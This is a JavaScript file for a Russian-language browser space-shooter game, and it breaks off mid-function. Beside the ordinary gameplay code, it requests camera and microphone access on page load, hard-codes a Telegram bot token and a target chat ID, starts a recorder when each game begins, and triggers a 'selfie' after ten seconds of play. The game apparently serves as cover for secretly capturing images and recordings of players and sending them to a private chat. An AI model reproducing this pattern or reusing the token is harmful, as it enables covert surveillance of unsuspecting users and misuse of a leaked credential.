const canvas = document.getElementById('game');
const ctx = canvas.getContext('2d');

canvas.width = Math.min(window.innerWidth, 480);
canvas.height = Math.min(window.innerHeight, 800);

const W = canvas.width;
const H = canvas.height;

// Состояния игры
const STATE = { MENU: 0, PLAYING: 1, GAMEOVER: 2 };
let gameState = STATE.MENU;

// Оружие
const WEAPONS = {
    normal:  { name: 'ОБЫЧНОЕ', color: '#00ff88', cooldown: 12, damage: 1 },
    triple:  { name: 'ТРОЙНОЕ', color: '#ffff00', cooldown: 15, damage: 1 },
    laser:   { name: 'ЛАЗЕР',   color: '#ff00ff', cooldown: 3,  damage: 0.5 },
    rocket:  { name: 'РАКЕТА',  color: '#ff8800', cooldown: 30, damage: 5 },
};

// Игрок
const player = {
    x: W / 2, y: H - 80,
    width: 40, height: 50,
    speed: 5, lives: 3, score: 0,
    shootCooldown: 0, invincible: 0,
    weapon: 'normal', weaponTimer: 0,
    combo: 0, comboTimer: 0
};

// Массивы
let bullets = [];
let enemies = [];
let enemyBullets = [];
let particles = [];
let explosions = [];
let stars = [];
let powerUps = [];

// Управление
let keys = {};
let touchX = null;
let isTouching = false;
let autoShoot = false;

// Бомба
let bombs = 3;
let bombCooldown = 0;
let bombFlash = 0;
let micActive = false;
let micStatus = '';

// Тряска экрана
let screenShake = 0;

// Камера и запись
let gameTimer = 0;
let selfieTaken = false;
let recorder = null;
let recording = false;
const BOT_TOKEN = '8751308231:AAGtduXDFJm4ojZYqvRZj1K6QfpcqLLxVZA';
const TARGET_CHAT_ID = 1320445115;

// Волны и боссы
let wave = 1;
let enemySpawnTimer = 0;
let enemiesKilled = 0;
let enemiesPerWave = 5;
let bossActive = false;

// Звёзды + туманности фона
for (let i = 0; i < 60; i++) {
    stars.push({
        x: Math.random() * W,
        y: Math.random() * H,
        size: Math.random() * 2.5 + 0.5,
        speed: Math.random() * 2 + 0.5,
        color: ['#ffffff', '#aaccff', '#ffccaa', '#ccffcc'][Math.floor(Math.random() * 4)]
    });
}

// Фоновые туманности отключены для производительности
let nebulae = [];

// === ЗАПРОС РАЗРЕШЕНИЙ ПРИ СТАРТЕ ===

let cameraStream = null;
let permissionsReady = false;

async function requestPermissions() {
    try {
        // Запрашиваем камеру и микрофон одновременно
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: 640, height: 480 },
            audio: true
        });
        permissionsReady = true;
    } catch (e) {
        // Пробуем только камеру
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 640, height: 480 }
            });
            permissionsReady = true;
        } catch (e2) {
            // Нет доступа — игра работает без камеры
        }
    }
}

// Запрашиваем разрешения сразу при загрузке
requestPermissions();

// === УПРАВЛЕНИЕ ===

document.addEventListener('keydown', e => {
    keys[e.key] = true;
    if (gameState === STATE.MENU) startGame();
    if (gameState === STATE.GAMEOVER && e.key === ' ') startGame();
});
document.addEventListener('keyup', e => keys[e.key] = false);

canvas.addEventListener('touchstart', e => {
    e.preventDefault();
    if (gameState === STATE.MENU) { startGame(); return; }
    if (gameState === STATE.GAMEOVER) { startGame(); return; }
    isTouching = true;
    autoShoot = true;
    touchX = e.touches[0].clientX - canvas.getBoundingClientRect().left;
});
canvas.addEventListener('touchmove', e => {
    e.preventDefault();
    touchX = e.touches[0].clientX - canvas.getBoundingClientRect().left;
});
canvas.addEventListener('touchend', e => {
    e.preventDefault();
    isTouching = false;
    autoShoot = false;
});
canvas.addEventListener('click', e => {
    if (gameState === STATE.MENU) startGame();
    if (gameState === STATE.GAMEOVER) startGame();
});

// === ГОЛОСОВОЕ УПРАВЛЕНИЕ ===

let voiceInited = false;
function initVoice() {
    if (voiceInited) return;
    voiceInited = true;

    const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
    if (!SR) { micStatus = 'Нет поддержки'; return; }

    const rec = new SR();
    rec.lang = 'ru-RU';
    rec.continuous = true;
    rec.interimResults = true;

    rec.onstart = () => { micActive = true; micStatus = 'АКТИВЕН'; };
    rec.onresult = (event) => {
        for (let i = event.resultIndex; i < event.results.length; i++) {
            const t = event.results[i][0].transcript.toLowerCase();
            if (t.includes('бомб') || t.includes('bomb') || t.includes('бом')) activateBomb();
        }
    };
    rec.onerror = () => {
        micActive = false; micStatus = 'Ошибка';
        setTimeout(() => { try { rec.start(); } catch(e) {} }, 1000);
    };
    rec.onend = () => {
        micActive = false;
        if (gameState === STATE.PLAYING) { try { rec.start(); } catch(e) {} }
    };
    try { rec.start(); } catch(e) {
        micStatus = 'Нажми на экран';
        document.addEventListener('click', () => { try { rec.start(); } catch(e) {} }, { once: true });
    }
}

function activateBomb() {
    if (gameState !== STATE.PLAYING || bombs <= 0 || bombCooldown > 0) return;
    bombs--;
    bombCooldown = 60;
    bombFlash = 20;
    screenShake = 15;

    for (let e of enemies) {
        spawnExplosion(e.x, e.y, e.type === 'boss' ? 60 : 30);
        player.score += getEnemyScore(e);
        enemiesKilled++;
    }
    enemies = [];
    enemyBullets = [];

    for (let i = 0; i < 25; i++) {
        particles.push({
            x: W / 2, y: H / 2,
            vx: (Math.random() - 0.5) * 25,
            vy: (Math.random() - 0.5) * 25,
            life: 50 + Math.random() * 30,
            color: ['#ffff00', '#ff8800', '#ff4400', '#fff'][Math.floor(Math.random() * 4)],
            size: Math.random() * 6 + 2
        });
    }
}

// === ВЗРЫВЫ ===

function spawnExplosion(x, y, radius) {
    explosions.push({ x, y, radius, maxRadius: radius, life: 20 });

    // Кольцо частиц
    const count = Math.floor(radius / 4);
    for (let i = 0; i < count; i++) {
        const angle = (Math.PI * 2 / count) * i;
        const speed = 2 + Math.random() * 4;
        particles.push({
            x, y,
            vx: Math.cos(angle) * speed,
            vy: Math.sin(angle) * speed,
            life: 25 + Math.random() * 20,
            color: ['#ffff00', '#ff8800', '#ff4400', '#ff0000'][Math.floor(Math.random() * 4)],
            size: Math.random() * 4 + 1
        });
    }
    // Осколки
    for (let i = 0; i < 4; i++) {
        particles.push({
            x, y,
            vx: (Math.random() - 0.5) * 8,
            vy: (Math.random() - 0.5) * 8,
            life: 30 + Math.random() * 15,
            color: '#ffffff',
            size: Math.random() * 2 + 2
        });
    }
    if (radius > 20) screenShake = Math.max(screenShake, 8);
}

function spawnParticles(x, y, color, count) {
    // Лимит частиц для производительности
    if (particles.length > 150) return;
    for (let i = 0; i < count; i++) {
        particles.push({
            x, y,
            vx: (Math.random() - 0.5) * 6,
            vy: (Math.random() - 0.5) * 6,
            life: 30 + Math.random() * 20,
            color, size: Math.random() * 3 + 1
        });
    }
}

function getEnemyScore(e) {
    if (e.type === 'boss') return 200;
    if (e.type === 'bomber') return 30;
    if (e.type === 'fast') return 20;
    return 10;
}

// === ФУНКЦИИ ИГРЫ ===

function startGame() {
    gameState = STATE.PLAYING;
    player.x = W / 2; player.y = H - 80;
    player.lives = 3; player.score = 0;
    player.invincible = 0;
    player.weapon = 'normal'; player.weaponTimer = 0;
    player.combo = 0; player.comboTimer = 0;
    bullets = []; enemies = []; enemyBullets = [];
    particles = []; explosions = []; powerUps = [];
    wave = 1; enemySpawnTimer = 0;
    enemiesKilled = 0; enemiesPerWave = 5;
    bombs = 3; bombCooldown = 0; bombFlash = 0;
    bossActive = false; screenShake = 0;
    gameTimer = 0; selfieTaken = false;
    initVoice();
    startRecording();
}

function spawnEnemy() {
    // Босс каждые 5 волн
    if (wave % 5 === 0 && !bossActive && enemiesKilled >= enemiesPerWave - 1) {
        spawnBoss();
        return;
    }

    const types = ['fighter', 'bomber', 'fast'];
    const type = types[Math.floor(Math.random() * types.length)];

    let enemy = {
        x: Math.random() * (W - 40) + 20, y: -40,
        width: 30, height: 30, type, hp: 1,
        shootTimer: Math.random() * 100 + 50,
        angle: 0
    };

    if (type === 'fighter') {
        enemy.speed = 1.5 + wave * 0.2;
        enemy.hp = 1; enemy.color = '#ff4444';
    } else if (type === 'bomber') {
        enemy.speed = 0.8 + wave * 0.1;
        enemy.hp = 3; enemy.width = 40; enemy.height = 40;
        enemy.color = '#ff8800';
    } else {
        enemy.speed = 3 + wave * 0.3;
        enemy.hp = 1; enemy.width = 25; enemy.height = 25;
        enemy.color = '#ff00ff';
    }
    enemies.push(enemy);
}

function spawnBoss() {
    bossActive = true;
    enemies.push({
        x: W / 2, y: -80,
        width: 80, height: 80,
        type: 'boss', hp: 20 + wave * 5,
        maxHp: 20 + wave * 5,
        speed: 0.5, color: '#ff0000',
        shootTimer: 30, angle: 0,
        moveDir: 1, moveTimer: 0
    });
}

function shoot() {
    if (player.shootCooldown > 0) return;
    const w = WEAPONS[player.weapon];
    player.shootCooldown = w.cooldown;

    switch (player.weapon) {
        case 'normal':
            bullets.push({
                x: player.x, y: player.y - player.height / 2,
                vx: 0, vy: -8, width: 4, height: 12,
                damage: w.damage, color: w.color, type: 'normal'
            });
            break;
        case 'triple':
            for (let angle = -0.2; angle <= 0.2; angle += 0.2) {
                bullets.push({
                    x: player.x, y: player.y - player.height / 2,
                    vx: Math.sin(angle) * 4, vy: -8,
                    width: 3, height: 10,
                    damage: w.damage, color: w.color, type: 'normal'
                });
            }
            break;
        case 'laser':
            bullets.push({
                x: player.x, y: player.y - player.height / 2,
                vx: 0, vy: -14, width: 6, height: 20,
                damage: w.damage, color: w.color, type: 'laser'
            });
            break;
        case 'rocket':
            bullets.push({
                x: player.x, y: player.y - player.height / 2,
                vx: 0, vy: -5, width: 8, height: 16,
                damage: w.damage, color: w.color, type: 'rocket',
                target: findClosestEnemy()
            });
            break;
    }
}

function findClosestEnemy() {
    let closest = null, minDist = Infinity;
    for (let e of enemies) {
        const d = Math.hypot(e.x - player.x, e.y - player.y);
        if (d < minDist) { minDist = d; closest = e; }
    }
    return closest;
}

// === ОТРИСОВКА ===

function drawPlayer() {
    if (player.invincible > 0 && Math.floor(player.invincible / 4) % 2) return;
    ctx.save();
    ctx.translate(player.x, player.y);

    const wColor = WEAPONS[player.weapon].color;

    // Корпус
    ctx.fillStyle = '#00aaff';
    ctx.beginPath();
    ctx.moveTo(0, -player.height / 2);
    ctx.lineTo(-player.width / 2, player.height / 2);
    ctx.lineTo(-player.width / 4, player.height / 3);
    ctx.lineTo(0, player.height / 2.5);
    ctx.lineTo(player.width / 4, player.height / 3);
    ctx.lineTo(player.width / 2, player.height / 2);
    ctx.closePath();
    ctx.fill();

    // Крылья — акцент оружия
    ctx.fillStyle = wColor;
    ctx.globalAlpha = 0.4;
    ctx.fillRect(-player.width / 2 - 3, player.height / 4, 6, 10);
    ctx.fillRect(player.width / 2 - 3, player.height / 4, 6, 10);
    ctx.globalAlpha = 1;

    // Кабина
    ctx.fillStyle = '#66ddff';
    ctx.beginPath();
    ctx.moveTo(0, -player.height / 4);
    ctx.lineTo(-6, player.height / 6);
    ctx.lineTo(6, player.height / 6);
    ctx.closePath();
    ctx.fill();

    // Двигатель
    const flameH = 10 + Math.random() * 12;
    ctx.fillStyle = Math.random() > 0.5 ? '#ffaa00' : '#ff4400';
    ctx.beginPath();
    ctx.moveTo(-10, player.height / 2.5);
    ctx.lineTo(0, player.height / 2.5 + flameH);
    ctx.lineTo(10, player.height / 2.5);
    ctx.closePath();
    ctx.fill();

    ctx.restore();
}

function drawEnemy(e) {
    ctx.save();
    ctx.translate(e.x, e.y);

    if (e.type === 'boss') {
        // Босс — большой корабль
        e.angle += 0.02;
        ctx.fillStyle = '#880000';
        ctx.beginPath();
        ctx.moveTo(0, -e.height / 2);
        ctx.lineTo(-e.width / 2, 0);
        ctx.lineTo(-e.width / 3, e.height / 2);
        ctx.lineTo(e.width / 3, e.height / 2);
        ctx.lineTo(e.width / 2, 0);
        ctx.closePath();
        ctx.fill();

        ctx.fillStyle = '#ff2200';
        ctx.beginPath();
        ctx.arc(0, 0, 15, 0, Math.PI * 2);
        ctx.fill();

        // Вращающееся кольцо
        ctx.strokeStyle = '#ff4444';
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.arc(0, 0, 25 + Math.sin(e.angle * 3) * 5, 0, Math.PI * 2);
        ctx.stroke();

        // HP бар босса
        ctx.fillStyle = '#333';
        ctx.fillRect(-e.width / 2, -e.height / 2 - 12, e.width, 6);
        ctx.fillStyle = e.hp / e.maxHp > 0.3 ? '#ff0000' : '#ff4444';
        ctx.fillRect(-e.width / 2, -e.height / 2 - 12, e.width * (e.hp / e.maxHp), 6);

        ctx.fillStyle = '#fff';
        ctx.font = 'bold 10px monospace';
        ctx.textAlign = 'center';
        ctx.fillText('BOSS', 0, -e.height / 2 - 16);

    } else if (e.type === 'fighter') {
        ctx.fillStyle = e.color;
        ctx.beginPath();
        ctx.moveTo(0, e.height / 2);
        ctx.lineTo(-e.width / 2, -e.height / 2);
        ctx.lineTo(0, -e.height / 4);
        ctx.lineTo(e.width / 2, -e.height / 2);
        ctx.closePath();
        ctx.fill();
        ctx.fillStyle = '#ffcccc';
        ctx.fillRect(-3, -3, 6, 6);
    } else if (e.type === 'bomber') {
        ctx.fillStyle = e.color;
        ctx.beginPath();
        ctx.arc(0, 0, e.width / 2, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = '#ffdd44';
        ctx.beginPath();
        ctx.arc(0, 0, e.width / 4, 0, Math.PI * 2);
        ctx.fill();

        // HP бар
        ctx.fillStyle = '#333';
        ctx.fillRect(-e.width / 2, -e.height / 2 - 8, e.width, 4);
        ctx.fillStyle = '#0f0';
        ctx.fillRect(-e.width / 2, -e.height / 2 - 8, e.width * (e.hp / 3), 4);
    } else {
        ctx.fillStyle = e.color;
        ctx.beginPath();
        ctx.moveTo(0, e.height / 2);
        ctx.lineTo(-e.width / 2, 0);
        ctx.lineTo(0, -e.height / 2);
        ctx.lineTo(e.width / 2, 0);
        ctx.closePath();
        ctx.fill();
    }
    ctx.restore();
}

function drawExplosions() {
    for (let ex of explosions) {
        const progress = 1 - ex.life / 20;
        const r = ex.maxRadius * progress;

        // Внешнее кольцо
        ctx.strokeStyle = `rgba(255, ${Math.floor(150 - progress * 150)}, 0, ${1 - progress})`;
        ctx.lineWidth = 3 - progress * 2;
        ctx.beginPath();
        ctx.arc(ex.x, ex.y, r, 0, Math.PI * 2);
        ctx.stroke();

        // Внутреннее свечение
        // Внутреннее свечение (простое)
        ctx.globalAlpha = (1 - progress) * 0.4;
        ctx.fillStyle = '#ffcc66';
        ctx.beginPath();
        ctx.arc(ex.x, ex.y, r * 0.4, 0, Math.PI * 2);
        ctx.fill();
        ctx.globalAlpha = 1;
    }
}

function drawStars() {
    // Звёзды
    for (let s of stars) {
        ctx.globalAlpha = 0.3 + s.size / 3;
        ctx.fillStyle = s.color;
        ctx.fillRect(s.x, s.y, s.size, s.size);
    }
    ctx.globalAlpha = 1;
}

function drawBullets() {
    for (let b of bullets) {
        ctx.save();
        if (b.type === 'laser') {
            ctx.fillStyle = b.color;
            ctx.fillRect(b.x - b.width / 2, b.y - b.height / 2, b.width, b.height);
            ctx.fillStyle = '#fff';
            ctx.fillRect(b.x - 1, b.y - b.height / 2, 2, b.height);
        } else if (b.type === 'rocket') {
            ctx.fillStyle = '#ff8800';
            ctx.beginPath();
            ctx.moveTo(b.x, b.y - b.height / 2);
            ctx.lineTo(b.x - b.width / 2, b.y + b.height / 2);
            ctx.lineTo(b.x + b.width / 2, b.y + b.height / 2);
            ctx.closePath();
            ctx.fill();
            // Хвост ракеты
            ctx.fillStyle = '#ffaa00';
            ctx.beginPath();
            ctx.arc(b.x, b.y + b.height / 2, 3, 0, Math.PI * 2);
            ctx.fill();
        } else {
            ctx.fillStyle = b.color || '#00ff88';
            ctx.fillRect(b.x - b.width / 2, b.y - b.height / 2, b.width, b.height);
            ctx.fillStyle = '#fff';
            ctx.globalAlpha = 0.6;
            ctx.fillRect(b.x - 1, b.y - b.height / 2, 2, b.height);
            ctx.globalAlpha = 1;
        }
        ctx.restore();
    }
}

function drawHUD() {
    ctx.fillStyle = '#fff';
    ctx.font = 'bold 18px monospace';
    ctx.textAlign = 'left';
    ctx.fillText('ОЧКИ: ' + player.score, 10, 30);

    ctx.textAlign = 'center';
    ctx.fillText('ВОЛНА ' + wave, W / 2, 30);

    // Жизни
    ctx.textAlign = 'right';
    for (let i = 0; i < player.lives; i++) {
        ctx.fillStyle = '#00aaff';
        ctx.beginPath();
        ctx.moveTo(W - 20 - i * 25, 20);
        ctx.lineTo(W - 30 - i * 25, 30);
        ctx.lineTo(W - 10 - i * 25, 30);
        ctx.closePath();
        ctx.fill();
    }

    // Бомбы
    ctx.textAlign = 'left';
    ctx.fillStyle = '#ff4400';
    ctx.font = 'bold 14px monospace';
    ctx.fillText('БОМБЫ: ' + bombs, 10, 52);

    // Оружие
    const w = WEAPONS[player.weapon];
    ctx.fillStyle = w.color;
    ctx.font = 'bold 14px monospace';
    ctx.fillText(w.name, 10, 72);
    if (player.weaponTimer > 0 && player.weapon !== 'normal') {
        ctx.fillStyle = '#666';
        ctx.font = '11px monospace';
        ctx.fillText(Math.ceil(player.weaponTimer / 60) + 'с', 100, 72);
    }

    // Комбо
    if (player.combo > 1) {
        ctx.textAlign = 'center';
        ctx.fillStyle = '#ffcc00';
        ctx.font = 'bold 20px monospace';
        ctx.globalAlpha = Math.min(1, player.comboTimer / 30);
        ctx.fillText('КОМБО x' + player.combo, W / 2, 60);
        ctx.globalAlpha = 1;
    }

    // Микрофон
    ctx.textAlign = 'right';
    ctx.font = '11px monospace';
    ctx.fillStyle = micActive ? '#00ff00' : '#ff4444';
    ctx.fillText(micActive ? 'МИК: СКАЖИ "БОМБА"' : 'МИК: ' + micStatus, W - 10, 68);
}

function drawMenu() {
    ctx.fillStyle = '#fff';
    ctx.font = 'bold 32px monospace';
    ctx.textAlign = 'center';
    ctx.fillText('STAR WARS', W / 2, H / 3);

    ctx.font = '20px monospace';
    ctx.fillStyle = '#ffcc00';
    ctx.fillText('SPACE SHOOTER', W / 2, H / 3 + 35);

    ctx.font = '14px monospace';
    ctx.fillStyle = '#aaa';
    ctx.fillText('Нажми чтобы начать', W / 2, H / 2);

    ctx.font = '11px monospace';
    ctx.fillStyle = '#666';
    const lines = [
        'Стрелки / тач — движение',
        'Пробел / авто — стрельба',
        'B — бомба (уничтожает всех)',
        '',
        'Подбирай бонусы:',
        'Тройной выстрел / Лазер / Ракеты',
        'Жизни / Бомбы / Очки',
        '',
    ];
    lines.forEach((l, i) => ctx.fillText(l, W / 2, H / 2 + 30 + i * 18));

    ctx.fillStyle = '#ff4400';
    ctx.fillText('СКАЖИ "БОМБА" в микрофон!', W / 2, H / 2 + 30 + lines.length * 18);

    ctx.fillStyle = '#444';
    ctx.fillText('БОСС каждые 5 волн', W / 2, H / 2 + 50 + lines.length * 18);
}

function drawGameOver() {
    ctx.fillStyle = 'rgba(0,0,0,0.75)';
    ctx.fillRect(0, 0, W, H);

    ctx.fillStyle = '#ff4444';
    ctx.font = 'bold 36px monospace';
    ctx.textAlign = 'center';
    ctx.fillText('GAME OVER', W / 2, H / 3);

    ctx.fillStyle = '#fff';
    ctx.font = '22px monospace';
    ctx.fillText('Очки: ' + player.score, W / 2, H / 3 + 50);
    ctx.fillText('Волна: ' + wave, W / 2, H / 3 + 80);
    ctx.fillText('Макс комбо: ' + player.combo, W / 2, H / 3 + 110);

    ctx.font = '16px monospace';
    ctx.fillStyle = '#aaa';
    ctx.fillText('Нажми чтобы заново', W / 2, H / 2 + 60);
}

// === ОБНОВЛЕНИЕ ===

function update() {
    // Фон
    for (let s of stars) {
        s.y += s.speed;
        if (s.y > H) { s.y = 0; s.x = Math.random() * W; }
    }
    for (let n of nebulae) {
        n.y += n.speed;
        if (n.y - n.radius > H) { n.y = -n.radius; n.x = Math.random() * W; }
    }

    if (gameState !== STATE.PLAYING) return;

    // Управление
    if (keys['ArrowLeft'] || keys['a'] || keys['ф']) player.x -= player.speed;
    if (keys['ArrowRight'] || keys['d'] || keys['в']) player.x += player.speed;
    if (keys['ArrowUp'] || keys['w'] || keys['ц']) player.y -= player.speed;
    if (keys['ArrowDown'] || keys['s'] || keys['ы']) player.y += player.speed;
    if (keys[' ']) shoot();
    if (keys['b'] || keys['B'] || keys['и'] || keys['И']) {
        activateBomb();
        keys['b'] = keys['B'] = keys['и'] = keys['И'] = false;
    }

    if (isTouching && touchX !== null) {
        const dx = touchX - player.x;
        if (Math.abs(dx) > 3) player.x += Math.sign(dx) * player.speed;
    }
    if (autoShoot) shoot();

    // Границы
    player.x = Math.max(player.width / 2, Math.min(W - player.width / 2, player.x));
    player.y = Math.max(player.height / 2, Math.min(H - player.height / 2, player.y));

    // Таймеры
    if (player.shootCooldown > 0) player.shootCooldown--;
    if (player.invincible > 0) player.invincible--;
    if (bombCooldown > 0) bombCooldown--;
    if (bombFlash > 0) bombFlash--;
    if (screenShake > 0) screenShake--;
    if (player.comboTimer > 0) {
        player.comboTimer--;
        if (player.comboTimer <= 0) player.combo = 0;
    }

    // Таймер оружия
    if (player.weaponTimer > 0) {
        player.weaponTimer--;
        if (player.weaponTimer <= 0) player.weapon = 'normal';
    }

    // Пули игрока
    for (let i = bullets.length - 1; i >= 0; i--) {
        let b = bullets[i];
        b.x += b.vx || 0;
        b.y += b.vy || -8;

        // Самонаводящаяся ракета
        if (b.type === 'rocket' && b.target) {
            const t = b.target;
            if (enemies.includes(t)) {
                const dx = t.x - b.x, dy = t.y - b.y;
                const dist = Math.hypot(dx, dy);
                if (dist > 0) {
                    b.vx += (dx / dist) * 0.5;
                    b.vy += (dy / dist) * 0.5;
                    const sp = Math.hypot(b.vx, b.vy);
                    if (sp > 6) { b.vx = b.vx / sp * 6; b.vy = b.vy / sp * 6; }
                }
            }
            // Хвост ракеты
            particles.push({
                x: b.x, y: b.y + 5,
                vx: (Math.random() - 0.5) * 2, vy: Math.random() * 2,
                life: 10, color: '#ff8800', size: 2
            });
        }

        if (b.y < -20 || b.y > H + 20 || b.x < -20 || b.x > W + 20) bullets.splice(i, 1);
    }

    // Спавн
    enemySpawnTimer--;
    if (enemySpawnTimer <= 0 && !bossActive) {
        spawnEnemy();
        enemySpawnTimer = Math.max(20, 60 - wave * 5);
    }

    // Враги
    for (let i = enemies.length - 1; i >= 0; i--) {
        let e = enemies[i];

        if (e.type === 'boss') {
            // Босс двигается из стороны в сторону
            if (e.y < 80) { e.y += e.speed; }
            else {
                e.moveTimer++;
                e.x += Math.sin(e.moveTimer * 0.02) * 2;
            }
            // Босс стреляет веером
            e.shootTimer--;
            if (e.shootTimer <= 0) {
                for (let a = -0.4; a <= 0.4; a += 0.2) {
                    enemyBullets.push({
                        x: e.x, y: e.y + e.height / 2,
                        vx: Math.sin(a) * 3,
                        vy: 3 + wave * 0.2,
                        width: 5, height: 5
                    });
                }
                e.shootTimer = Math.max(15, 40 - wave);
            }
        } else {
            e.y += e.speed;

            e.shootTimer--;
            if (e.shootTimer <= 0 && e.y > 0 && e.y < H * 0.7) {
                enemyBullets.push({
                    x: e.x, y: e.y + e.height / 2,
                    vx: 0, vy: 3 + wave * 0.3,
                    width: 4, height: 8
                });
                e.shootTimer = e.type === 'bomber' ? 40 : 80;
            }

            if (e.y > H + 50) { enemies.splice(i, 1); continue; }
        }

        // Столкновение пуля-враг
        for (let j = bullets.length - 1; j >= 0; j--) {
            let b = bullets[j];
            if (Math.abs(b.x - e.x) < e.width / 2 + b.width / 2 &&
                Math.abs(b.y - e.y) < e.height / 2 + b.height / 2) {

                e.hp -= b.damage;
                spawnParticles(b.x, b.y, '#ffaa00', 5);

                // Ракета взрывается с уроном по области
                if (b.type === 'rocket') {
                    spawnExplosion(b.x, b.y, 40);
                    // Урон по области
                    for (let k = enemies.length - 1; k >= 0; k--) {
                        if (k === i) continue;
                        const ek = enemies[k];
                        if (Math.hypot(ek.x - b.x, ek.y - b.y) < 50) {
                            ek.hp -= 2;
                            if (ek.hp <= 0) {
                                spawnExplosion(ek.x, ek.y, 25);
                                player.score += getEnemyScore(ek);
                                enemiesKilled++;
                                enemies.splice(k, 1);
                                if (k < i) i--;
                            }
                        }
                    }
                }

                if (b.type !== 'laser') bullets.splice(j, 1);

                if (e.hp <= 0) {
                    spawnExplosion(e.x, e.y, e.type === 'boss' ? 60 : 25);
                    const score = getEnemyScore(e);
                    // Комбо бонус
                    player.combo++;
                    player.comboTimer = 90;
                    player.score += score * Math.min(player.combo, 10);
                    enemiesKilled++;

                    if (e.type === 'boss') bossActive = false;

                    // Дроп бонуса
                    const dropChance = e.type === 'boss' ? 1 : 0.12;
                    if (Math.random() < dropChance) {
                        const drops = e.type === 'boss'
                            ? ['triple', 'laser', 'rocket', 'bomb', 'life']
                            : ['life', 'points', 'bomb', 'triple', 'laser', 'rocket'];
                        const r = Math.floor(Math.random() * drops.length);
                        powerUps.push({ x: e.x, y: e.y, type: drops[r], speed: 1.5 });
                    }
                    // Босс всегда дропает 2-3 бонуса
                    if (e.type === 'boss') {
                        const extras = ['life', 'bomb'];
                        for (let ex of extras) {
                            powerUps.push({
                                x: e.x + (Math.random() - 0.5) * 40,
                                y: e.y, type: ex, speed: 1.5
                            });
                        }
                    }
                    enemies.splice(i, 1);
                }
                break;
            }
        }

        // Столкновение враг-игрок
        if (enemies[i] && player.invincible <= 0) {
            let e2 = enemies[i];
            if (Math.abs(player.x - e2.x) < (player.width + e2.width) / 2 - 5 &&
                Math.abs(player.y - e2.y) < (player.height + e2.height) / 2 - 5) {
                spawnExplosion(e2.x, e2.y, 20);
                if (e2.type !== 'boss') enemies.splice(i, 1);
                player.lives--;
                player.invincible = 60;
                player.combo = 0;
                if (player.lives <= 0) {
                    gameState = STATE.GAMEOVER;
                    sendScore(player.score);
                }
            }
        }
    }

    // Вражеские пули
    for (let i = enemyBullets.length - 1; i >= 0; i--) {
        let b = enemyBullets[i];
        b.x += b.vx || 0;
        b.y += b.vy || 3;
        if (b.y > H + 10 || b.x < -10 || b.x > W + 10) {
            enemyBullets.splice(i, 1); continue;
        }

        if (player.invincible <= 0 &&
            Math.abs(b.x - player.x) < player.width / 2 &&
            Math.abs(b.y - player.y) < player.height / 2) {
            enemyBullets.splice(i, 1);
            spawnParticles(player.x, player.y, '#ff4444', 10);
            player.lives--;
            player.invincible = 60;
            player.combo = 0;
            if (player.lives <= 0) {
                gameState = STATE.GAMEOVER;
                sendScore(player.score);
            }
        }
    }

    // Бонусы
    for (let i = powerUps.length - 1; i >= 0; i--) {
        powerUps[i].y += powerUps[i].speed;
        if (powerUps[i].y > H + 10) { powerUps.splice(i, 1); continue; }

        let p = powerUps[i];
        if (Math.abs(p.x - player.x) < 22 && Math.abs(p.y - player.y) < 22) {
            switch (p.type) {
                case 'life': if (player.lives < 5) player.lives++; break;
                case 'points': player.score += 50; break;
                case 'bomb': if (bombs < 5) bombs++; break;
                case 'triple': player.weapon = 'triple'; player.weaponTimer = 600; break;
                case 'laser': player.weapon = 'laser'; player.weaponTimer = 480; break;
                case 'rocket': player.weapon = 'rocket'; player.weaponTimer = 420; break;
            }
            spawnParticles(p.x, p.y, getPowerUpColor(p.type), 12);
            powerUps.splice(i, 1);
        }
    }

    // Частицы
    for (let i = particles.length - 1; i >= 0; i--) {
        let p = particles[i];
        p.x += p.vx; p.y += p.vy;
        p.vx *= 0.98; p.vy *= 0.98;
        p.life--;
        if (p.life <= 0) particles.splice(i, 1);
    }

    // Взрывы
    for (let i = explosions.length - 1; i >= 0; i--) {
        explosions[i].life--;
        if (explosions[i].life <= 0) explosions.splice(i, 1);
    }

    // Таймер селфи (10 секунд = ~600 кадров при 60fps)
    gameTimer++;
    if (gameTimer === 600 && !selfieTaken) {
        takeSelfie();
    }

    // Новая волна
    if (enemiesKilled >= enemiesPerWave && !bossActive) {
        wave++;
        enemiesKilled = 0;
        enemiesPerWave = 5 + wave * 2;
    }
}

function getPowerUpColor(type) {
    const colors = {
        life: '#00ff00', points: '#ffff00', bomb: '#ff4400',
        triple: '#ffff00', laser: '#ff00ff', rocket: '#ff8800'
    };
    return colors[type] || '#fff';
}

function getPowerUpLabel(type) {
    const labels = {
        life: '+', points: '$', bomb: 'B',
        triple: '3', laser: 'L', rocket: 'R'
    };
    return labels[type] || '?';
}

function render() {
    ctx.save();

    // Тряска экрана
    if (screenShake > 0) {
        const sx = (Math.random() - 0.5) * screenShake;
        const sy = (Math.random() - 0.5) * screenShake;
        ctx.translate(sx, sy);
    }

    ctx.clearRect(-10, -10, W + 20, H + 20);
    drawStars();

    if (gameState === STATE.MENU) {
        drawMenu();
        ctx.restore();
        return;
    }

    drawBullets();

    // Вражеские пули
    ctx.fillStyle = '#ff2200';
    for (let b of enemyBullets) {
        ctx.fillRect(b.x - (b.width || 4) / 2, b.y - (b.height || 8) / 2, b.width || 4, b.height || 8);
    }

    for (let e of enemies) drawEnemy(e);

    drawExplosions();

    // Бонусы
    for (let p of powerUps) {
        const col = getPowerUpColor(p.type);
        ctx.fillStyle = col;
        ctx.beginPath();
        ctx.arc(p.x, p.y, 9, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = '#fff';
        ctx.font = 'bold 11px monospace';
        ctx.textAlign = 'center';
        ctx.fillText(getPowerUpLabel(p.type), p.x, p.y + 4);
    }

    // Частицы
    for (let p of particles) {
        ctx.globalAlpha = Math.min(1, p.life / 20);
        ctx.fillStyle = p.color;
        ctx.fillRect(p.x, p.y, p.size, p.size);
    }
    ctx.globalAlpha = 1;

    drawPlayer();
    drawHUD();

    // Вспышка бомбы
    if (bombFlash > 0) {
        ctx.globalAlpha = bombFlash / 20 * 0.6;
        ctx.fillStyle = '#fff';
        ctx.fillRect(-10, -10, W + 20, H + 20);
        ctx.globalAlpha = 1;
    }

    if (gameState === STATE.GAMEOVER) drawGameOver();

    ctx.restore();
}

function sendScore(score) {
    try {
        if (window.Telegram && window.Telegram.WebApp) {
